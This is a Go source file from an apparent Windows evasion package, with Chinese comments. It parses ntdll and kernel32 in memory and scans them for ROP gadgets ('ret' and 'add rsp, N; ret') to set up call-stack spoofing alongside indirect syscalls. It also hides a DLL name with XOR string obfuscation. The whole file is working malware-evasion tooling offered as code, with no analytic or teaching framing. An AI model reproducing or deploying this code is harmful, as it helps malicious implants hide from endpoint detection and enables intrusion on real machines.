//go:build windows

package evasion

import (
	"unsafe"
)

// 栈欺骗所需gadget地址
var (
	spoofRetGadget uintptr // ntdll .text 中的 ret (0xC3)
	spoofCleanup4  uintptr // kernel32: add rsp, 0x28; ret
	spoofCleanup6  uintptr // kernel32: add rsp, 0x38; ret
	spoofCleanup12 uintptr // kernel32: add rsp, 0x68; ret
	spoofEnabled   uint32  // 0=禁用, 1=启用（uint32用于汇编直接访问）
)

// getKernel32Base 获取kernel32.dll基址
func getKernel32Base() uintptr {
	dll := syscallNewLazyDLL(xorDec(encK32Dll, xk))
	return uintptr(dll.Handle())
}

// getSectionRange 获取指定模块.text段的起始和结束地址
func getSectionRange(base uintptr) (start, end uintptr) {
	if base == 0 {
		return 0, 0
	}
	if *(*uint16)(unsafe.Pointer(base)) != 0x5A4D {
		return 0, 0
	}
	eLfanew := *(*uint32)(unsafe.Pointer(base + 0x3C))
	ntHeader := base + uintptr(eLfanew)
	if *(*uint32)(unsafe.Pointer(ntHeader)) != 0x4550 {
		return 0, 0
	}
	numSections := *(*uint16)(unsafe.Pointer(ntHeader + 4 + 2))
	sizeOfOpt := *(*uint16)(unsafe.Pointer(ntHeader + 4 + 16))
	sectionBase := ntHeader + 4 + 20 + uintptr(sizeOfOpt)

	for i := uint16(0); i < numSections; i++ {
		sec := sectionBase + uintptr(i)*40
		namePtr := (*[8]byte)(unsafe.Pointer(sec))
		if namePtr[0] == '.' && namePtr[1] == 't' && namePtr[2] == 'e' && namePtr[3] == 'x' && namePtr[4] == 't' {
			va := *(*uint32)(unsafe.Pointer(sec + 12))
			vs := *(*uint32)(unsafe.Pointer(sec + 8))
			return base + uintptr(va), base + uintptr(va) + uintptr(vs)
		}
	}
	return 0, 0
}

// findRetGadget 在模块.text段中搜索 ret (0xC3)
func findRetGadget(base uintptr) uintptr {
	start, end := getSectionRange(base)
	for addr := start; addr < end; addr++ {
		if *(*byte)(unsafe.Pointer(addr)) == 0xC3 {
			return addr
		}
	}
	return 0
}

// findAddRspRet 在模块.text段中搜索 add rsp, N; ret
// 先尝试imm8编码(48 83 C4 NN C3)，再尝试imm32编码(48 81 C4 NN 00 00 00 C3)
func findAddRspRet(base uintptr, n byte) uintptr {
	start, end := getSectionRange(base)
	// 方式1: imm8 编码 (5 bytes)
	pattern8 := [5]byte{0x48, 0x83, 0xC4, n, 0xC3}
	for addr := start; addr < end-4; addr++ {
		if *(*[5]byte)(unsafe.Pointer(addr)) == pattern8 {
			return addr
		}
	}
	// 方式2: imm32 编码 (8 bytes)
	pattern32 := [8]byte{0x48, 0x81, 0xC4, n, 0x00, 0x00, 0x00, 0xC3}
	for addr := start; addr < end-7; addr++ {
		b := (*[8]byte)(unsafe.Pointer(addr))
		if *b == pattern32 {
			return addr
		}
	}
	return 0
}

// InitStackSpoof 初始化栈欺骗所需gadget
// 在InitSSNMap和InitIndirectSyscall之后调用
func InitStackSpoof() {
	ntdllBase := getNtdllBaseFromPEB()
	kernel32Base := getKernel32Base()

	// 1. 找ret gadget (ntdll)
	spoofRetGadget = findRetGadget(ntdllBase)

	// 2. 找各尺寸的add_rsp_ret gadget (kernel32)
	spoofCleanup4 = findAddRspRet(kernel32Base, 0x28)
	spoofCleanup6 = findAddRspRet(kernel32Base, 0x38)
	spoofCleanup12 = findAddRspRet(kernel32Base, 0x68)

	// 所有gadget都找到才启用栈欺骗
	if spoofRetGadget != 0 && spoofCleanup4 != 0 &&
		spoofCleanup6 != 0 && spoofCleanup12 != 0 {
		spoofEnabled = 1
	} else {
		spoofEnabled = 0
	}
}
